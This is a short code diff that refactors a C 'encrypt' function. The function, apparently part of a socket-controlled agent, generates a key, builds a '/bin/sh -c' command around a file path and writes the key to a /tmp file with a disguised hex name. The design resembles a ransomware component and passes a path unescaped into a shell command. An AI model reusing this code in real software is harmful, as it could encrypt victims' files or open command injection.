@@ -266,20 +266,12 @@ char* generate_key(){
 }
 
 void encrypt(int sockfd,const char *filepath){
-    Command cmd = {
-        .cmd_id = "0",
-        .delay = 0,
-        .program = strdup("/bin/sh"), // Dynamically allocate program
-        .expected_exit_code = 0,
-    };
     char *key = generate_key(); // key generation
     if (!key) {
         output_log("encrypt : Failed to generate encryption key\n", LOG_ERROR, LOG_TO_ALL);
-        free_command(&cmd);
         free(key);
         return;
     }
-
     char command[2048];
     snprintf(
         command, sizeof(command),
@@ -287,7 +279,14 @@ void encrypt(int sockfd,const char *filepath){
         filepath, key
     );
 
-    cmd.params = (char*[]) { "-c", command, NULL };
+    Command cmd = {
+        .cmd_id = "0",
+        .delay = 0,
+        .program = strdup("/bin/sh"), // Dynamically allocate program
+        .expected_exit_code = 0,
+        .params = (char*[]) { "-c", command, NULL }
+    };
+    
     output_log("encrypt : Encrypting files with command: %s\n", LOG_DEBUG, LOG_TO_CONSOLE, command);
     
     write_encrypted_file("/tmp/31d6cfe0d16ae931b73c59d7e0c089c0.log", key); // Write the key to a file
